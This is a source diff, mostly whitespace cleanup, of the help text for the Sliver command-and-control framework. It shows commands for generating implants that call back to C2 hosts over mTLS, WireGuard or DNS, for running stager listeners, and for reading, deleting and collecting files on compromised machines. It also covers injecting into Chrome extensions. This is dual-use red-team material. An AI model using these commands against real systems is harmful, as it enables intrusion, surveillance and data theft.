@@ -147,10 +147,10 @@ You must specificy at least one c2 endpoint when generating an implant, this can
 The command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
 
 The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
-	generate --mtls foo.example.com 
+	generate --mtls foo.example.com
 
 The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
-then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys, 
+then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys,
 then connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.
 	generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888
 
@@ -163,28 +163,28 @@ Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O,
 with the --os and --format flags.
 
 To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
-	generate --mtls foo.example.com 
+	generate --mtls foo.example.com
 	generate --os windows --arch 64bit --mtls foo.example.com
 
 A Windows DLL can be generated with the following command:
 	generate --format shared --mtls foo.example.com
 
 To output a MacOS Mach-O executable file, the following command would be used
-	generate --os mac --mtls foo.example.com 
+	generate --os mac --mtls foo.example.com
 
 To output a Linux ELF executable file, the following command would be used:
-	generate --os linux --mtls foo.example.com 
+	generate --os linux --mtls foo.example.com
 
 
 [[.Bold]][[.Underline]]++ DNS Canaries ++[[.Normal]]
-DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. 
-This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt 
-to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, 
+DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process.
+This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt
+to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered,
 and which implant file was discovered along with any affected sessions.
 
 [[.Bold]]Important:[[.Normal]] You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).
 
-Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated 
+Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated
 canaries and their status using the "canaries" command:
 	generate --mtls foo.example.com --canary 1.foobar.com
 
@@ -198,12 +198,16 @@ command.
 `
 	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
 [[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Sliver profile.
-[[.Bold]]Examples:[[.Normal]] 
+[[.Bold]]Examples:[[.Normal]]
 
 The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-sliver-profile[[.Normal]] profile to it.
 When a stager calls back to this URL, a sliver corresponding to the said profile will be sent.
 
 stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
+
+You can also specify a network interface name instead of an IP address:
+
+stage-listener --url tcp://tun0:8080 --profile my-sliver-profile
 
 To create a profile, use the [[.Bold]]profiles new[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
 
@@ -236,7 +240,7 @@ settings. Generated implants will still have per-binary certificates/obfuscation
 [[.Bold]]About:[[.Normal]] List processes on remote system.`
 
 	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <implant name/session>
-[[.Bold]]About:[[.Normal]] Ping session by name or the active session. This does NOT send an ICMP packet, it just sends a small 
+[[.Bold]]About:[[.Normal]] Ping session by name or the active session. This does NOT send an ICMP packet, it just sends a small
 C2 message round trip to ensure the remote implant is still responding to commands.`
 
 	killHelp = `[[.Bold]]Command:[[.Normal]] kill <implant name/session>
@@ -281,7 +285,7 @@ On Windows, escaping is disabled. Instead, '\\' is treated as path separator.
 	rmHelp = `[[.Bold]]Command:[[.Normal]] rm [remote path]
 [[.Bold]]About:[[.Normal]] Delete a remote file or directory.`
 
-	catHelp = `[[.Bold]]Command:[[.Normal]] cat <remote path> 
+	catHelp = `[[.Bold]]Command:[[.Normal]] cat <remote path>
 [[.Bold]]About:[[.Normal]] Cat a remote file to stdout.`
 
 	downloadHelp = `[[.Bold]]Command:[[.Normal]] download [remote src] <local dst>
@@ -306,10 +310,10 @@ Downloads can be filtered using the following patterns:
 If you need to match a special character (*, ?, '-', '[', ']', '\\'), place '\\' in front of it (example: \\?).
 On Windows, escaping is disabled. Instead, '\\' is treated as path separator.`
 
-	headHelp = `[[.Bold]]Command:[[.Normal]] head [--bytes/-b <number of bytes>] [--lines/-l <number of lines>] <remote path> 
+	headHelp = `[[.Bold]]Command:[[.Normal]] head [--bytes/-b <number of bytes>] [--lines/-l <number of lines>] <remote path>
 	[[.Bold]]About:[[.Normal]] Fetch the first number of bytes or lines from a remote file and display it to stdout.`
 
-	tailHelp = `[[.Bold]]Command:[[.Normal]] tail [--bytes/-b <number of bytes>] [--lines/-l <number of lines>] <remote path> 
+	tailHelp = `[[.Bold]]Command:[[.Normal]] tail [--bytes/-b <number of bytes>] [--lines/-l <number of lines>] <remote path>
 	[[.Bold]]About:[[.Normal]] Fetch the last number of bytes or lines from a remote file and display it to stdout.`
 
 	uploadHelp = `[[.Bold]]Command:[[.Normal]] upload [local src] <remote dst>
@@ -429,7 +433,7 @@ Parameters to the Linux and MacOS shared module are passed using the [[.Bold]]LD
 	screenshotHelp = `[[.Bold]]Command:[[.Normal]] screenshot
 [[.Bold]]About:[[.Normal]] Take a screenshot from the remote implant.
 `
-	loadAliasHelp = `[[.Bold]]Command:[[.Normal]] load-macro <directory path> 
+	loadAliasHelp = `[[.Bold]]Command:[[.Normal]] load-macro <directory path>
 [[.Bold]]About:[[.Normal]] Load a Sliver macro to add new commands.
 Macros are using the [[.Bold]]sideload[[.Normal]] or [[.Bold]]spawndll[[.Normal]] commands under the hood, depending on the use case.
 For Linux and Mac OS, the [[.Bold]]sideload[[.Normal]] command will be used. On Windows, it will depend the macro file is a reflective DLL or not.
@@ -643,9 +647,9 @@ ssh -l ubuntu ec2-instance ps aux
 	lootHelp = `[[.Bold]]Command:[[.Normal]] loot
 [[.Bold]]About:[[.Normal]] Store and share loot between operators.
 
-A piece of loot is a file, that can be one of two loot types: text or binary. 
+A piece of loot is a file, that can be one of two loot types: text or binary.
 
-Sliver will attempt to detect the type of file automatically or you can specify a file type with 
+Sliver will attempt to detect the type of file automatically or you can specify a file type with
 --file-type. You can add local files as loot using the "local" sub-command, or you can add files
 from a session using the "remote" sub-command.
 
@@ -686,10 +690,10 @@ using SliverPy (Python) or sliver-script (TypeScript/JavaScript).
 	)
 
 	reactionSetHelp = fmt.Sprintf(`[[.Bold]]Command:[[.Normal]] reaction set
-[[.Bold]]About:[[.Normal]] Set automated commands in reaction to event(s).  
+[[.Bold]]About:[[.Normal]] Set automated commands in reaction to event(s).
 
-The built-in reactions do not support variables or logic, they simply allow you to 
-run verbatim commands when an event occurs. To implement complex event-based logic 
+The built-in reactions do not support variables or logic, they simply allow you to
+run verbatim commands when an event occurs. To implement complex event-based logic
 we recommend using SliverPy (Python) or sliver-script (TypeScript/JavaScript).
 
 [[.Bold]]Examples:[[.Normal]]
@@ -751,8 +755,8 @@ If no extension is specified, Sliver will enumerate all installed extensions, ex
 permissions and determine a valid target for injection. For Cursed Chrome to work properly
 the target extension must have either of these two sets of permissions:
 
-1. "webRequest" "webRequestBlocking" "<all_urls>" 
-2. "webRequest" "webRequestBlocking" "http://*/*" "https://*/*" 
+1. "webRequest" "webRequestBlocking" "<all_urls>"
+2. "webRequest" "webRequestBlocking" "http://*/*" "https://*/*"
 
 More information: https://github.com/mandatoryprogrammer/CursedChrome
 `
@@ -1303,7 +1307,7 @@ On Windows, escaping is disabled. Instead, '\\' is treated as path separator.`
 
 	servicesHelp = `[[.Bold]]Command:[[.Normal]] services [-H <hostname>]
 [[.Bold]]About:[[.Normal]] Get information about services and control them (start, stop).
-	
+
 To get information about services, you need to be an authenticated user on the system or domain. To control services, you need administrator or higher privileges.`
 )
 
